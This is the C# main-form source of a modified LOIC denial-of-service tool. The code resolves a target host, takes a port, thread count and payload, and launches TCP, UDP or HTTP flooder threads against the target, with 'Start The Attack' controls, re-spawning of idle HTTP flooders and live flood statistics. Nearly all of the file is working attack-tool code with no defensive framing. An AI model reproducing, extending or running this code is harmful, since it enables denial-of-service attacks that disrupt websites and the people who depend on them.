using System;
using System.Linq;
using System.Net;
using System.Windows.Forms;
using System.Globalization;

namespace LOIC
{
    public partial class frmMain : Form
    {
        #region Fields
        private bool attack;
        private static IFlooder[] arr;

        private static string sIP, sData, sSubsite;
        private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
        private static bool bResp, intShowStats;
        #endregion

        #region Constructors
        public frmMain()
        {
            InitializeComponent();
        }
        #endregion

        #region Event handlers
        private void frmMain_Load(object sender, EventArgs e)
        {
            this.Text = String.Format("{0} | Modified Version | v. {1}", Application.ProductName, Application.ProductVersion);
        }

        private void cmdTargetURL_Click(object sender, EventArgs e)
        {
            string url = txtTargetURL.Text.ToLower();
            if (url.Length == 0)
            {

                {
                    MessageBox.Show("Oops! Seems like you've forgotten the URL!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return;
            }
            if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
            else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
            try
            {
                txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList.Single().ToString();
            }
            catch
            {

                {
                    MessageBox.Show("Please write the complete address.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void cmdTargetIP_Click(object sender, EventArgs e)
        {
            if (txtTargetIP.Text.Length == 0)
            {

                {
                    MessageBox.Show("Oops! Seem like you've forgotten the IP!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return;
            }
            txtTarget.Text = txtTargetIP.Text;
        }

        private void txtTarget_Enter(object sender, EventArgs e)
        {
            cmdAttack.Focus();
        }

        private void cmdAttack_Click(object sender, EventArgs e)
        {
            if (!attack)
            {
                attack = true;
                try
                {
                    sIP = txtTarget.Text;

                    if (!Int32.TryParse(txtPort.Text, out iPort))
                        throw new Exception("The port is incorrect! Please fix.");

                    if (!Int32.TryParse(txtThreads.Text, out iThreads))
                        throw new Exception("The threads field is incorrect! Please fix");

                    if (String.IsNullOrEmpty(txtTarget.Text) || String.Equals(txtTarget.Text, "N O N E !"))
                        throw new Exception("Select a target.");

                    iProtocol = 0;
                    if (String.Equals(cbMethod.Text, "TCP")) iProtocol = 1;
                    if (String.Equals(cbMethod.Text, "UDP")) iProtocol = 2;
                    if (String.Equals(cbMethod.Text, "HTTP")) iProtocol = 3;
                    if (iProtocol == 0)
                        throw new Exception("Select a proper attack method.");

                    sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
                    if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
                        throw new Exception("Spamming without contents? That's unheard of.");

                    if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
                        throw new Exception("You have to enter a subsite (for example \"/\")");
                    else
                        sSubsite = txtSubsite.Text;

                    if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
                        throw new Exception("Timeout field is incorrect! Please fix.");

                    bResp = chkResp.Checked;
                }
                catch (Exception ex)
                {

                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    attack = false;
                    return;
                }

                cmdAttack.Text = "Stop The Attack";

                if (iProtocol == 1 || iProtocol == 2)
                {
                    arr = new XXPFlooder[iThreads];
                    for (int a = 0; a < arr.Length; a++)
                    {
                        arr[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
                        arr[a].Start();
                    }
                }
                else if (iProtocol == 3)
                {
                    arr = new HTTPFlooder[iThreads];
                    for (int a = 0; a < arr.Length; a++)
                    {
                        arr[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
                        arr[a].Start();
                    }
                }

                tShowStats.Start();
            }
            else
            {
                attack = false;
                cmdAttack.Text = "Start The Attack";
                tShowStats.Stop();
                arr = null;
            }
        }

        private void tShowStats_Tick(object sender, EventArgs e)
        {
            if (intShowStats) return; intShowStats = true;

            bool isFlooding = false;
            if (iProtocol == 1 || iProtocol == 2)
            {
                int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
                lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
            }
            if (iProtocol == 3)
            {
                int iIdle = 0;
                int iConnecting = 0;
                int iRequesting = 0;
                int iDownloading = 0;
                int iDownloaded = 0;
                int iRequested = 0;
                int iFailed = 0;

                for (int a = 0; a < arr.Length; a++)
                {
                    HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
                    iDownloaded += httpFlooder.Downloaded;
                    iRequested += httpFlooder.Requested;
                    iFailed += httpFlooder.Failed;
                    switch (httpFlooder.State)
                    {
                        case ReqState.Ready:
                        case ReqState.Completed:
                            {
                                iIdle++;
                                break;
                            }
                        case ReqState.Connecting:
                            {
                                iConnecting++;
                                break;
                            }
                        case ReqState.Requesting:
                            {
                                iRequesting++;
                                break;
                            }
                        case ReqState.Downloading:
                            {
                                iDownloading++;
                                break;
                            }
                    }
                    if (isFlooding && !httpFlooder.IsFlooding)
                    {
                        int iaDownloaded = httpFlooder.Downloaded;
                        int iaRequested = httpFlooder.Requested;
                        int iaFailed = httpFlooder.Failed;
                        httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
                        {
                            Downloaded = iaDownloaded,
                            Requested = iaRequested,
                            Failed = iaFailed
                        };
                        httpFlooder.Start();
                        arr[a] = httpFlooder;
                    }
                }
                lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
                lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
                lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
                lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
                lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
                lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
                lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
            }

            intShowStats = false;
        }

        private void tbSpeed_ValueChanged(object sender, EventArgs e)
        {
            iDelay = tbSpeed.Value;
            if (arr != null)
            {
                foreach (var f in arr)
                {
                    f.Delay = iDelay;
                }
            }
        }
        #endregion

        private void txtTarget_TextChanged(object sender, EventArgs e)
        {

        }

        private void txtTargetURL_TextChanged(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Clipboard.SetText(txtTarget.Text);
        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string url = txtTargetURL.Text.ToLower();
            if (url.Length == 0)
            {

                {
                    MessageBox.Show("Oops! Seems like you've forgotten the URL!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return;
            }
            if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
            else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
            try
            {
                txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList.Single().ToString();
            }
            catch
            {

                {
                    MessageBox.Show("Please write the complete address.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
